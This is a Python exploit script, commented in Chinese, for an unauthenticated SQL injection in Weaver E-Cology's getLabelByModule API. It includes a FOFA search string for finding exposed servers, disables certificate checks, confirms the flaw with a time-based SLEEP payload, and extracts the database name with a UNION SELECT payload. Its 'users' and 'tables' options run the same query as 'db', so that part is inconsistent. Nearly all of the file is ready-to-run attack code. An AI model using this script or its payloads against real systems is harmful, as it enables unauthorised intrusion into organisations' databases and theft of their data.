#!/usr/bin/env python3
"""
泛微 E-Cology getLabelByModule SQL注入
- 影响版本: E-Cology 多个版本
- CVSS: 高危
- 类型: SQL 注入
- 描述: /api/ec/dev/locale/getLabelByModule 接口的 moduleCode 参数存在 UNION 注入
FOFA: app="泛微-E-Weaver" && title="协同平台"
"""
import argparse, urllib.request, urllib.parse, ssl, sys, time

BANNER = """
  泛微 E-Cology getLabelByModule SQL注入
  Critical | SQL Injection | 未授权
"""

def send_get(url, timeout=15):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.read().decode('utf-8', errors='ignore'), resp.getcode()
    except urllib.request.HTTPError as e:
        return e.read().decode('utf-8', errors='ignore'), e.code
    except Exception as ex:
        return str(ex), 0

def check(target):
    """检测 getLabelByModule SQL注入"""
    base = target.rstrip('/')
    # 正常请求
    normal_url = base + "/api/ec/dev/locale/getLabelByModule?moduleCode=test"
    # 注入 union
    evil_url = base + "/api/ec/dev/locale/getLabelByModule?moduleCode=aaa')+union+select+'1','2','3'--"
    # 延迟检测
    sleep_url = base + "/api/ec/dev/locale/getLabelByModule?moduleCode=aaa')+AND+SLEEP(5)--"

    print(f"  [*] 正常请求...")
    _, code = send_get(normal_url, 10)
    if code == 200:
        print(f"  [+] 接口可达 (HTTP {code})")

    print(f"  [*] 延迟注入检测 (sleep 5s)...")
    start = time.time()
    resp, code = send_get(sleep_url, 30)
    elapsed = time.time() - start
    if elapsed >= 4:
        print(f"  [+] 漏洞确认! 延迟 {elapsed:.1f}s")
        return True
    else:
        print(f"  [-] 未检测到延迟")
        return False

def extract_db_name(target):
    """提取数据库名"""
    base = target.rstrip('/')
    payload = f"aaa')+UNION+SELECT+1,db_name(),3,4,5,6,7,8,9,10--"
    url = base + f"/api/ec/dev/locale/getLabelByModule?moduleCode={urllib.parse.quote(payload)}"
    resp, _ = send_get(url, 15)
    return resp

def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--extract", choices=["db", "users", "tables"], help="提取数据")
    args = parser.parse_args()

    print(f"\n[*] 目标: {args.target}")
    if args.check:
        check(args.target)
    elif args.extract:
        result = extract_db_name(args.target)
        print(f"\n[+] 结果:\n{result[:2000]}")
    else:
        print(f"[*] 参考: https://github.com/guoql666/POC (泛微 getLabelByModule SQL注入)")

if __name__ == "__main__":
    main()
